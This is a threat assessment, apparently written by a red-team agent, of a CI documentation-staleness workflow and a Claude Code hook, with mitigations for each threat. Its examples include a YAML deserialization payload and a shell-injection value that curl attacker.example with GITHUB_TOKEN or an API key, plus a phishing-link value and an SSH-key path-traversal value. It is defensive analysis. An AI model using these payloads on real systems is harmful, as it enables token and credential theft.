# Threat Assessment: Category 2 Agentic Documentation Workflow (TICKET-4/5/6)

> Scope: TICKET-4 (freshness auditing workflow), TICKET-5 (doc-source-map.yml), TICKET-6 (local Claude Code hook)
> Context: Open-source repository (geekatron/jerry) on GitHub; PRs can originate from forks
> Classification: Advisory -- findings for incorporation into GitHub Issue security sections
> ATT&CK TA: TA0001 (Initial Access), TA0009 (Collection), TA0040 (Impact)

---

## Document Sections

| Section | Purpose |
|---------|---------|
| [Summary](#summary) | Overall risk posture |
| [Threat Surface Overview](#threat-surface-overview) | What is being attacked |
| [TH-001: YAML Injection via Mapping File](#th-001-yaml-injection-via-mapping-file) | YAML parsing attack vectors |
| [TH-002: PR Comment Injection and Phishing](#th-002-pr-comment-injection-and-phishing) | Comment content manipulation |
| [TH-003: Escalation Counter Weaponization](#th-003-escalation-counter-weaponization) | Blocking legitimate PRs |
| [TH-004: Fork PR Token Permissions](#th-004-fork-pr-token-permissions) | GITHUB_TOKEN on fork PRs |
| [TH-005: Local Hook Environment Compromise](#th-005-local-hook-environment-compromise) | Malicious mapping file in developer env |
| [TH-006: Path Traversal and Exfiltration via Mapping](#th-006-path-traversal-and-exfiltration-via-mapping) | Mapping as read primitive |
| [Risk Register](#risk-register) | Consolidated risk table |
| [Mitigations by Ticket](#mitigations-by-ticket) | Implementation guidance per ticket |

---

## Summary

The proposed system introduces three surfaces that can be abused by a malicious PR author:
(1) the YAML mapping file, (2) the PR comment posting mechanism, and (3) the local Claude Code hook.
Of the six attack vectors assessed, two are HIGH severity with straightforward mitigations, three are MEDIUM
with design-level controls, and one (fork token) is LOW because GitHub's architecture already prevents it.
The escalation counter is the highest operational risk: improperly scoped, it can be weaponized to permanently
block legitimate PRs.

**Overall risk posture: MEDIUM -- acceptable for implementation with the mitigations documented below.**

---

## Threat Surface Overview

```
[Fork PR author]
      |
      | (1) Submits PR containing modified .github/doc-source-map.yml
      |
      v
[CI Job: staleness check]
      |--- reads doc-source-map.yml  (2) YAML injection surface
      |--- computes diff             (no untrusted input here)
      |--- posts PR comment          (3) comment content injection
      |--- reads/writes counter      (4) escalation counter abuse
      |--- uses GITHUB_TOKEN         (5) fork token permissions
      v
[Developer workstation]
      |--- Claude Code hook reads doc-source-map.yml  (6) local env compromise
```

---

## TH-001: YAML Injection via Mapping File

**Severity: HIGH**
**ATT&CK: T1195.001 (Supply Chain: Compromise Software Dependencies), T1059 (Command Execution via interpreter)**

### Attack

A PR author modifies `.github/doc-source-map.yml` to include YAML that exploits insecure parsing.
Two sub-vectors:

**TH-001a: yaml.load() with a malicious tag**
If the CI script calls `yaml.load()` (insecure) instead of `yaml.safe_load()`, a payload such as:

```yaml
source: !!python/object/apply:os.system ["curl https://attacker.example/exfil?token=$GITHUB_TOKEN"]
```

executes arbitrary code in the CI runner process. The GITHUB_TOKEN and any secrets present in the runner
environment would be exposed. This is a full CI runner compromise.

**TH-001b: Oversized or malformed YAML (DoS)**
A deeply nested or extremely large YAML file could cause the parser to consume excessive memory or CPU,
effectively DoS-ing the CI job that reads it. This does not execute code but disrupts the CI pipeline.

### Context

The existing codebase already bans `yaml.load()` and `yaml.unsafe_load()` in `src/` via the CI security
scan job (ci.yml lines 98-113, rule M-04b). However, that scan only covers `src/` -- a new script
in `scripts/` that parses the mapping file would not be covered unless the glob is extended.

### Status

TH-001a: Partially mitigated by existing M-04b enforcement, but coverage gap exists for scripts outside src/.
TH-001b: Unmitigated by existing controls.

### Required Mitigations

- Use `yaml.safe_load()` exclusively in the mapping parser script (no PyYAML object tags).
- Add a file-size cap before parsing (e.g., reject files > 64 KB; mapping files have no legitimate reason
  to exceed this).
- Extend M-04b scan glob to cover `scripts/` in addition to `src/`.
- Validate that all values in the parsed YAML are strings matching expected path patterns
  before using them in any filesystem or shell operation.

---

## TH-002: PR Comment Injection and Phishing

**Severity: MEDIUM**
**ATT&CK: T1566 (Phishing -- targeting PR reviewers), T1190 (Exploit Public-Facing Application)**

### Attack

The CI job posts a PR comment whose content is derived from the mapping file. If the mapping file
is attacker-controlled (via PR), the comment content is indirectly attacker-controlled.

**TH-002a: Markdown injection**
If the mapping values (file paths) are embedded directly into a Markdown comment without sanitization,
an attacker could craft a mapping entry whose value contains Markdown that renders a phishing link:

```yaml
# Malicious entry in doc-source-map.yml
sources:
  - path: "src/legit.py"
    doc: "[Click here to verify your GitHub account](https://attacker.example/steal-token)"
```

The CI job posts a comment containing that link. A maintainer reading the comment clicks it thinking
it is a legitimate doc link.

**TH-002b: Comment flooding**
If the job posts a new comment on every CI run (not upsert/update-existing), an attacker who repeatedly
pushes to their fork branch would flood the PR with bot comments, degrading readability.

### Relevant Observation

The existing `coverage-report` job (ci.yml line 478) uses `create-new-comment: false`, which means it
updates an existing comment rather than posting a new one. The same pattern must be enforced for the
staleness comment to prevent TH-002b.

### Required Mitigations

- Strip or allowlist the set of characters permitted in mapping file values before embedding them in
  comment text. File path characters only: `[a-zA-Z0-9_./-]`. Reject any value containing `[`, `]`,
  `(`, `)`, `http`, or other Markdown link syntax.
- Use upsert-mode for PR comments (find-and-update, not create-new) with a stable comment marker
  (e.g., `<!-- doc-freshness-check -->`). This limits one bot comment per PR regardless of push count.
- The comment body should state the source of the data: "Source: `.github/doc-source-map.yml` in this PR."
  This makes it transparent to reviewers that the comment reflects the PR's own mapping, reducing
  the social engineering surface.

---

## TH-003: Escalation Counter Weaponization

**Severity: HIGH**
**ATT&CK: T1499 (Endpoint Denial of Service), T1565.001 (Stored Data Manipulation)**

### Attack

The design specifies an escalation counter: if a mapped doc is flagged as stale in 3+ consecutive PRs
without update, escalate from warning to error (blocking). The attack vector depends on where the
counter is stored.

**TH-003a: Counter stored in the mapping file (attacker-controlled)**
If the counter is embedded in `.github/doc-source-map.yml` (which a PR author can modify), an attacker
can simply set the counter to 3 for a legitimate source file. Every future PR that touches that source
file will be blocked with an error, even if the docs are current.

```yaml
# Attacker-modified counter in mapping file
sources:
  - path: "src/shared_kernel/exceptions.py"
    doc: "docs/reference/exceptions.md"
    stale_count: 3  # attacker-controlled; escalates to blocking
```

**TH-003b: Counter stored in a branch or workflow artifact (race condition)**
If the counter is stored in a GitHub Actions artifact or in a branch file, a malicious PR could attempt
to pollute the stored state through concurrent PR activity. This is harder to exploit but the impact
is the same: blocking legitimate PRs.

**TH-003c: Counter never resets**
If a maintainer updates the doc, but the counter does not reset to zero, eventually all paths accumulate
to the blocking threshold organically, degrading CI for all contributors.

### Required Mitigations

- The escalation counter MUST NOT be stored in any file that a PR can modify. Specifically, it must
  not live in `.github/doc-source-map.yml`. Valid storage locations:
  - A branch on the main repo (write-protected from fork PRs) updated only after merge to main.
  - A GitHub repository variable or environment variable set by maintainers.
  - A separate tracking file committed only on default branch, never in PR diffs.
- Counter scope should be per-mapping-entry, and should reset to zero when the doc file is updated
  in any merged PR.
- Consider whether the escalation-to-blocking feature is worth the operational risk. An advisory-only
  design (no blocking escalation) eliminates TH-003 entirely. If blocking is required, document the
  counter storage location explicitly in TICKET-4 acceptance criteria.

---

## TH-004: Fork PR Token Permissions

**Severity: LOW (already mitigated by GitHub architecture)**
**ATT&CK: T1552.001 (Credentials in Files -- attempted)**

### Attack (and Why It Does Not Work)

A concern with any CI job that posts PR comments is whether GITHUB_TOKEN from a fork PR has sufficient
permissions to write comments, and whether a fork PR could exfiltrate the token.

**Finding:** GitHub Actions has a structural control that prevents fork PRs from accessing write-scoped
tokens. For PRs from forks, the GITHUB_TOKEN is automatically restricted to read-only permissions,
regardless of the `permissions:` block in the workflow. This means:

- The staleness-check job cannot post PR comments when triggered by a fork PR using the standard
  `pull_request` event with GITHUB_TOKEN alone.
- The token is not exfiltrable via YAML injection (TH-001) because it has read-only scope and cannot
  be used to modify the repo even if captured.

**Operational consequence (not a security risk, but a functional gap):** The CI job as designed will
silently fail to post comments on fork PRs. This needs to be addressed at the design level.

### Resolution Options

1. Use the `pull_request_target` event instead of `pull_request`. This runs in the context of the base
   repo and has write permissions. WARNING: `pull_request_target` must be handled carefully -- any
   step that checks out the PR's code and runs it (e.g., executing scripts from the PR) can lead to
   arbitrary code execution with write permissions. The staleness-check job must only read the mapping
   file from the checked-out PR code and post a comment; it must not execute any script from the PR.

2. Use a two-workflow pattern: `pull_request` (read-only, fork-safe) writes the comment content to an
   artifact, and a separate `workflow_run` workflow (triggered on completion of the first, runs with
   write permissions) reads the artifact and posts the comment. This is the GitHub-recommended
   pattern for secure fork PR comments.

3. Accept that fork PRs will not receive the staleness comment. The CI job posts a comment only on
   internal PRs; fork PRs see no comment.

Option 2 is the most secure. Option 1 is acceptable only if the job never executes code from the PR.
Document the chosen option in TICKET-4 acceptance criteria.

---

## TH-005: Local Hook Environment Compromise

**Severity: MEDIUM**
**ATT&CK: T1059 (Command Execution), T1553.004 (Code Signing -- bypass)**

### Attack

The TICKET-6 hook reads `.github/doc-source-map.yml` from the working tree. If a developer has checked
out a branch containing a malicious mapping file, the hook processes it in their local Claude Code session.

**TH-005a: Path traversal in mapping values**
If the hook uses mapping values as file paths in Python `open()` or `Path()` calls without validation,
an attacker could include a traversal path:

```yaml
sources:
  - path: "src/legit.py"
    doc: "../../../.ssh/id_rsa"
```

If the hook reads or logs the doc path's contents for any reason (e.g., to check if it was edited in
the session), it would access the SSH private key.

**TH-005b: Hook spawning subprocesses with mapping data**
If the hook implementation uses `subprocess.run()` or `os.system()` with mapping values interpolated
as arguments, shell injection becomes possible:

```yaml
sources:
  - path: "src/legit.py"
    doc: "docs/ref.md; curl https://attacker.example/shell-exfil?token=$(cat ~/.config/anthropic/api_key)"
```

**TH-005c: Mapping file triggering hook on sensitive developer files**
An attacker could add entries to the mapping that trigger advisories when the developer edits
sensitive files (e.g., `.env`, `~/.ssh/config`), not to execute code, but to map the developer's
edit behavior for reconnaissance (T1592).

### Context

The existing pre-tool-use.py hook (hooks/pre-tool-use.py) delegates entirely to the jerry CLI via
`uv run jerry hooks pre-tool-use`. The new hook would follow the same pattern. The risk surface is
in the jerry CLI's hook handler implementation for the new feature.

### Required Mitigations

- All values read from the mapping file must be treated as untrusted strings.
- Path values must be validated against a strict allowlist before any filesystem operation:
  only allow `[a-zA-Z0-9_./-]`, maximum 512 characters, no `..` components, must resolve within
  the repo root (use `Path.resolve()` and assert the resolved path starts with repo root).
- No subprocess execution using mapping values. The hook must never interpolate mapping data into
  shell commands.
- The hook must not read the contents of doc files -- it only checks whether the file was edited
  in the current session (a boolean check against Claude Code's tool-use log). Reading file
  contents is not necessary for the advisory to function.
- Add a schema validation step: load the mapping with `yaml.safe_load()`, then validate the
  structure against a JSON Schema before processing any values.

---

## TH-006: Path Traversal and Exfiltration via Mapping (CI Context)

**Severity: LOW-MEDIUM**
**ATT&CK: T1083 (File and Directory Discovery), T1005 (Data from Local System)**

### Attack

In the CI job, the staleness check reads the mapping file and uses the source and doc paths to determine
which files changed. If these paths are used in shell glob expansion or passed to git commands without
sanitization, path traversal could allow an attacker to probe for files outside the repo.

**TH-006a: Shell glob expansion**
If the CI script does `git diff --name-only HEAD~1 | grep -E "$source_pattern"` where `$source_pattern`
comes from an unsanitized mapping value, an attacker could inject regex metacharacters or shell
expansion characters to match unintended files.

**TH-006b: Existence check on sensitive paths**
If the CI job validates that all mapping paths exist (as specified in TICKET-5 acceptance criteria:
"CI validation that all paths in mapping exist"), an attacker could include paths like
`/etc/passwd` or GitHub Actions runner secrets directories. The check will fail, but the error message
could reveal whether those paths exist on the runner.

### Required Mitigations

- Perform path existence validation using the Python `Path` API with explicit repo-root anchoring,
  not shell commands. `Path(repo_root / value).resolve()` followed by `assert resolved.is_relative_to(repo_root)`.
- Never pass mapping values to grep patterns or shell expansion. Use Python string comparison on
  the output of `git diff --name-only` rather than pattern-matching with attacker-controlled values.
- Error messages from path validation failures must not include the full path value from the mapping
  file -- use a fixed string: "A path in doc-source-map.yml does not exist. See CI log for details."
  Log the actual path only to the CI debug log, not to the PR comment.

---

## Risk Register

| ID | Threat | Severity | Likelihood | Impact | Ticket | Mitigated By |
|----|--------|----------|------------|--------|--------|--------------|
| TH-001a | YAML deserialization RCE via yaml.load() | HIGH | Medium (existing M-04b partially covers) | Full CI runner compromise | T5 | yaml.safe_load() + extend M-04b coverage |
| TH-001b | YAML DoS via malformed file | MEDIUM | Low | CI job failure | T5 | File size cap before parse |
| TH-002a | Phishing link injection into PR comment | MEDIUM | Medium | Social engineering of maintainer | T4 | Path value allowlist before embedding in comment |
| TH-002b | Comment flooding via repeated pushes | LOW | High (will happen organically) | PR readability degradation | T4 | Upsert-mode comments only |
| TH-003a | Escalation counter in attacker-controlled file | HIGH | High (obvious if counter is in map file) | Permanent blocking of legitimate PRs | T4 | Counter must be stored outside PR-modifiable files |
| TH-003b | Counter race condition via concurrent PRs | LOW | Low | Incorrect counter state | T4 | Append-only counter with merge-time reset |
| TH-004 | Fork PR token privilege escalation | LOW (mitigated by GitHub) | N/A | N/A | T4 | GitHub fork token restriction; use workflow_run pattern |
| TH-004-functional | Staleness comment not posted on fork PRs | MEDIUM (functional, not security) | High | Feature broken for OSS contributors | T4 | Use workflow_run two-workflow pattern |
| TH-005a | Path traversal in local hook via mapping values | MEDIUM | Medium | Developer file read | T6 | Path validation + repo-root anchoring |
| TH-005b | Shell injection in local hook | MEDIUM | Low (if jerry CLI is careful) | Developer environment compromise | T6 | No subprocess with mapping data |
| TH-005c | Edit-behavior reconnaissance via crafted mapping | LOW | Low | Attacker maps developer edit patterns | T6 | Acceptable residual risk |
| TH-006a | Glob injection in CI git commands | LOW | Low | Unintended file matching | T5 | Python Path API instead of shell patterns |
| TH-006b | Sensitive path existence probing via validation | LOW | Low | Runner filesystem reconnaissance | T5 | Repo-root anchoring + fixed error messages |

---

## Mitigations by Ticket

### TICKET-4 (Design: freshness auditing workflow)

Security requirements to add to acceptance criteria:

1. **Counter storage constraint:** Escalation counter MUST be stored in a file that cannot be modified
   by a PR (e.g., committed to default branch only, updated only on merge). Document the chosen
   storage mechanism. Alternative: remove blocking escalation entirely; advisory-only eliminates
   TH-003 entirely.

2. **Fork PR comment strategy:** Choose and document one of the three options described in TH-004.
   Recommendation: two-workflow pattern (`pull_request` + `workflow_run`) for correctness and security.

3. **Comment upsert:** CI job must find-and-update an existing bot comment (identified by marker
   `<!-- doc-freshness-check -->`) rather than posting a new comment on each run.

4. **Comment content sanitization:** The PR comment body must only contain file paths validated against
   `[a-zA-Z0-9_./-]`. No raw mapping file values embedded without allowlist check.

### TICKET-5 (Implementation: doc-source-map.yml)

Security requirements to add to acceptance criteria:

1. **yaml.safe_load() only:** The CI script parsing the mapping file MUST use `yaml.safe_load()`.
   NEVER `yaml.load()` or `yaml.unsafe_load()`. Add this to the script's inline comment.

2. **Extend M-04b coverage:** The existing banned-YAML-API check in ci.yml must cover `scripts/`
   in addition to `src/`. The new parsing script will live in `scripts/`; it must be covered.

3. **File size cap:** Before calling `yaml.safe_load()`, check `file.stat().st_size <= 65536`. Reject
   and fail the job if exceeded. Mapping files have no legitimate reason to be large.

4. **Path allowlist validation:** After parsing, iterate all `source` and `doc` values. Reject any
   value not matching `^[a-zA-Z0-9_./-]+$` and not resolving within the repo root. Fail the job
   with a fixed error message (do not echo the raw value into PR comments).

5. **JSON Schema for mapping format:** The JSON Schema referenced in acceptance criteria must constrain
   values to the path allowlist pattern. Use `"pattern": "^[a-zA-Z0-9_./-]+$"` on all path fields.

### TICKET-6 (Implementation: local Claude Code hook)

Security requirements to add to acceptance criteria:

1. **No subprocess with mapping data:** The hook implementation must not pass any value from the
   mapping file to `subprocess.run()`, `os.system()`, or any shell execution context.

2. **Path validation with repo-root anchoring:** All path values from the mapping file must be
   validated with `Path(repo_root / value).resolve()` followed by assertion that the resolved path
   is relative to `repo_root`. Reject and emit a warning (do not crash) if validation fails.

3. **Read-only use of paths:** The hook must only check whether a path was edited in the current
   Claude Code session (boolean). It must not open, read, or stat doc files by path.

4. **Structural schema validation before processing:** After `yaml.safe_load()`, validate the mapping
   structure against the JSON Schema from TICKET-5 before iterating any values.

5. **Graceful degradation on parse error:** If the mapping file is missing, malformed, or fails
   validation, the hook must exit silently without blocking Claude Code. Advisory hooks must never
   block the developer's primary tool.

---

> Produced for incorporation into TICKET-4, TICKET-5, TICKET-6 GitHub Issue descriptions.
> Scope: passive threat analysis of proposed design. No active network scanning performed.
> ATT&CK references: TA0001, TA0009, TA0040; T1195.001, T1059, T1566, T1190, T1499, T1565.001,
>   T1552.001, T1553.004, T1592, T1083, T1005.
> Generated: 2026-03-09 | Agent: red-recon | Engagement: PROJ-030-bugs analysis
